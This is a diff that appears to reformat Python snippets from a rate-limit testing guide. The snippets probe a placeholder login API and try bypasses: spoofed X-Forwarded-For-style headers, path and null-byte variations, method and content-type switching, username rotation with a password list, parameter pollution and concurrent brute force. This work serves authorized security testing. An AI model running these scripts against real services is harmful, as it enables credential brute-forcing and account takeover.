@@ -68,6 +68,7 @@ import time
 BASE_URL = "https://target-api.example.com/api/v1"
 headers = {"Authorization": "Bearer <token>", "Content-Type": "application/json"}
 
+
 # Send requests and track rate limit headers
 def probe_rate_limit(endpoint, method="GET", count=100):
     results = []
@@ -78,15 +79,16 @@ def probe_rate_limit(endpoint, method="GET", count=100):
             "remaining": resp.headers.get("X-RateLimit-Remaining") or resp.headers.get("X-Rate-Limit-Remaining"),
             "reset": resp.headers.get("X-RateLimit-Reset") or resp.headers.get("X-Rate-Limit-Reset"),
             "retry_after": resp.headers.get("Retry-After"),
-            "status": resp.status_code
+            "status": resp.status_code,
         }
         results.append(rate_headers)
         if resp.status_code == 429:
-            print(f"Rate limited at request {i+1}: {rate_headers}")
-            return results, i+1
+            print(f"Rate limited at request {i + 1}: {rate_headers}")
+            return results, i + 1
         time.sleep(0.05)  # Small delay to avoid connection issues
     print(f"No rate limit triggered after {count} requests")
     return results, count
+
 
 # Test key endpoints
 login_results, login_threshold = probe_rate_limit("/auth/login", "POST", 200)
@@ -123,25 +125,27 @@ IP_SPOOFING_HEADERS = [
     "X-Akamai-Client-IP",
 ]
 
+
 def test_ip_spoofing_bypass(endpoint, method="POST", body=None):
     """Test if IP spoofing headers bypass rate limiting."""
     # First, trigger the rate limit normally
     for i in range(200):
         resp = requests.request(method, f"{BASE_URL}{endpoint}", headers=headers, json=body)
         if resp.status_code == 429:
-            print(f"Rate limit triggered at request {i+1}")
+            print(f"Rate limit triggered at request {i + 1}")
             break
 
     # Now test each spoofing header
     bypasses_found = []
     for header in IP_SPOOFING_HEADERS:
-        spoofed_headers = {**headers, header: f"10.0.{i%256}.{(i*7)%256}"}
+        spoofed_headers = {**headers, header: f"10.0.{i % 256}.{(i * 7) % 256}"}
         resp = requests.request(method, f"{BASE_URL}{endpoint}", headers=spoofed_headers, json=body)
         if resp.status_code != 429:
             bypasses_found.append(header)
             print(f"[BYPASS] {header} -> {resp.status_code}")
 
     return bypasses_found
+
 
 login_body = {"username": "test@example.com", "password": "wrongpassword"}
 bypasses = test_ip_spoofing_bypass("/auth/login", "POST", login_body)
@@ -154,38 +158,43 @@ bypasses = test_ip_spoofing_bypass("/auth/login", "POST", login_body)
 def test_path_variation_bypass(base_endpoint, token):
     """Test if path variations bypass rate limit tied to specific endpoint."""
     variations = [
-        base_endpoint,                          # /api/v1/auth/login
-        base_endpoint + "/",                    # /api/v1/auth/login/
-        base_endpoint.upper(),                  # /API/V1/AUTH/LOGIN
-        base_endpoint + "?dummy=1",             # /api/v1/auth/login?dummy=1
-        base_endpoint + "#fragment",            # /api/v1/auth/login#fragment
-        base_endpoint + "%20",                  # /api/v1/auth/login%20
-        base_endpoint + "/..",                  # /api/v1/auth/login/..
+        base_endpoint,  # /api/v1/auth/login
+        base_endpoint + "/",  # /api/v1/auth/login/
+        base_endpoint.upper(),  # /API/V1/AUTH/LOGIN
+        base_endpoint + "?dummy=1",  # /api/v1/auth/login?dummy=1
+        base_endpoint + "#fragment",  # /api/v1/auth/login#fragment
+        base_endpoint + "%20",  # /api/v1/auth/login%20
+        base_endpoint + "/..",  # /api/v1/auth/login/..
         base_endpoint.replace("/v1/", "/v2/"),  # /api/v2/auth/login
-        base_endpoint + ";",                    # /api/v1/auth/login;
-        base_endpoint + "\t",                   # Tab character
-        base_endpoint + "%00",                  # Null byte
-        base_endpoint + "..;/",                 # Spring path traversal
+        base_endpoint + ";",  # /api/v1/auth/login;
+        base_endpoint + "\t",  # Tab character
+        base_endpoint + "%00",  # Null byte
+        base_endpoint + "..;/",  # Spring path traversal
     ]
 
     # Trigger rate limit on original endpoint first
     for i in range(200):
-        resp = requests.post(f"{BASE_URL}{base_endpoint}",
-                           headers={"Authorization": f"Bearer {token}"},
-                           json={"username": "test", "password": "wrong"})
+        resp = requests.post(
+            f"{BASE_URL}{base_endpoint}",
+            headers={"Authorization": f"Bearer {token}"},
+            json={"username": "test", "password": "wrong"},
+        )
         if resp.status_code == 429:
             break
 
     # Test variations
     for variant in variations:
         try:
-            resp = requests.post(f"{BASE_URL}{variant}",
-                               headers={"Authorization": f"Bearer {token}"},
-                               json={"username": "test", "password": "wrong"})
+            resp = requests.post(
+                f"{BASE_URL}{variant}",
+                headers={"Authorization": f"Bearer {token}"},
+                json={"username": "test", "password": "wrong"},
+            )
             if resp.status_code != 429:
                 print(f"[BYPASS] Path variation: {variant} -> {resp.status_code}")
         except Exception:
             pass
+
 
 test_path_variation_bypass("/auth/login", "<token>")
 ```
@@ -209,9 +218,9 @@ def test_method_bypass(endpoint, original_body):
 
     # Trigger rate limit with POST + application/json
     for i in range(200):
-        resp = requests.post(f"{BASE_URL}{endpoint}",
-                           headers={**headers, "Content-Type": "application/json"},
-                           json=original_body)
+        resp = requests.post(
+            f"{BASE_URL}{endpoint}", headers={**headers, "Content-Type": "application/json"}, json=original_body
+        )
         if resp.status_code == 429:
             break
 
@@ -219,8 +228,7 @@ def test_method_bypass(endpoint, original_body):
     for method in methods_to_test:
         if method == "POST":
             continue
-        resp = requests.request(method, f"{BASE_URL}{endpoint}",
-                              headers=headers, json=original_body)
+        resp = requests.request(method, f"{BASE_URL}{endpoint}", headers=headers, json=original_body)
         if resp.status_code not in (429, 405):
             print(f"[BYPASS] Method switch to {method}: {resp.status_code}")
 
@@ -233,10 +241,10 @@ def test_method_bypass(endpoint, original_body):
             data = "&".join(f"{k}={v}" for k, v in original_body.items())
             resp = requests.post(f"{BASE_URL}{endpoint}", headers=test_headers, data=data)
         else:
-            resp = requests.post(f"{BASE_URL}{endpoint}", headers=test_headers,
-                               data=str(original_body))
+            resp = requests.post(f"{BASE_URL}{endpoint}", headers=test_headers, data=str(original_body))
         if resp.status_code != 429:
             print(f"[BYPASS] Content-Type {ct}: {resp.status_code}")
+
 
 test_method_bypass("/auth/login", {"username": "test@example.com", "password": "wrong"})
 ```
@@ -247,6 +255,7 @@ test_method_bypass("/auth/login", {"username": "test@example.com", "password": "
 # Bypass Technique 4: Rotate identifiers to avoid per-account limits
 import string
 import random
+
 
 def test_account_rotation_bypass(login_endpoint, target_password_list):
     """Test if rate limit is per-account, bypassed by rotating usernames."""
@@ -265,8 +274,7 @@ def test_account_rotation_bypass(login_endpoint, target_password_list):
 
     for password in target_password_list[:50]:
         for email_var in email_variations:
-            resp = requests.post(f"{BASE_URL}{login_endpoint}",
-                               json={"username": email_var, "password": password})
+            resp = requests.post(f"{BASE_URL}{login_endpoint}", json={"username": email_var, "password": password})
             if resp.status_code == 200:
                 print(f"[SUCCESS] Logged in with: {email_var} / {password}")
                 return True
@@ -277,18 +285,19 @@ def test_account_rotation_bypass(login_endpoint, target_password_list):
 
     return False
 
+
 # Bypass Technique 5: Parameter pollution
 def test_parameter_pollution_bypass(endpoint):
     """Add extra parameters to make each request appear unique."""
     for i in range(200):
-        random_param = ''.join(random.choices(string.ascii_lowercase, k=8))
+        random_param = "".join(random.choices(string.ascii_lowercase, k=8))
         resp = requests.post(
             f"{BASE_URL}{endpoint}?{random_param}={i}",
             headers=headers,
-            json={"username": "test@example.com", "password": f"attempt_{i}"}
+            json={"username": "test@example.com", "password": f"attempt_{i}"},
         )
         if resp.status_code == 429:
-            print(f"Parameter pollution failed at request {i+1}")
+            print(f"Parameter pollution failed at request {i + 1}")
             return False
     print("[BYPASS] Parameter pollution: 200 requests without rate limit")
     return True
@@ -300,6 +309,7 @@ def test_parameter_pollution_bypass(endpoint):
 import asyncio
 import aiohttp
 
+
 async def distributed_rate_limit_test(endpoint, total_requests=1000, concurrency=50):
     """Test rate limiting under concurrent load."""
     results = {"success": 0, "rate_limited": 0, "errors": 0}
@@ -307,14 +317,11 @@ async def distributed_rate_limit_test(endpoint, total_requests=1000, concurrency
     async def make_request(session, request_num):
         try:
             # Rotate X-Forwarded-For per request
-            req_headers = {
-                **headers,
-                "X-Forwarded-For": f"192.168.{request_num % 256}.{(request_num * 3) % 256}"
-            }
+            req_headers = {**headers, "X-Forwarded-For": f"192.168.{request_num % 256}.{(request_num * 3) % 256}"}
             async with session.post(
                 f"{BASE_URL}{endpoint}",
                 headers=req_headers,
-                json={"username": "test@example.com", "password": f"attempt_{request_num}"}
+                json={"username": "test@example.com", "password": f"attempt_{request_num}"},
             ) as resp:
                 if resp.status == 429:
                     results["rate_limited"] += 1
@@ -334,7 +341,8 @@ async def distributed_rate_limit_test(endpoint, total_requests=1000, concurrency
     print(f"  Successful: {results['success']}")
     print(f"  Rate Limited: {results['rate_limited']}")
     print(f"  Errors: {results['errors']}")
-    print(f"  Bypass Rate: {results['success']/(results['success']+results['rate_limited'])*100:.1f}%")
+    print(f"  Bypass Rate: {results['success'] / (results['success'] + results['rate_limited']) * 100:.1f}%")
+
 
 # asyncio.run(distributed_rate_limit_test("/auth/login"))
 ```
